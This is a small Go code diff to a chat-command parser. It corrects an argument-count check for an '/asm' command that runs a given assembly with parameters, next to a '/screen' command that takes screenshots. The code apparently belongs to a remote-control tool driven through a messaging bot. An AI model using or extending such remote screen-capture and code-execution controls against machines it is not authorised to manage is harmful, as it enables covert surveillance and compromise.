@@ -54,7 +54,7 @@ func parseCommand(chatID int64, text string) {
 	case "/screen":
 		takeScreenshots(chatID)
 	case "/asm":
-		if len(commandParts) > 2 {
+		if len(commandParts) < 2 {
 			SendMessage(chatID, "Wrong usage. Usage: /asm <assembly-file|assembly-hash> <assembly-params>")
 			return
 		}
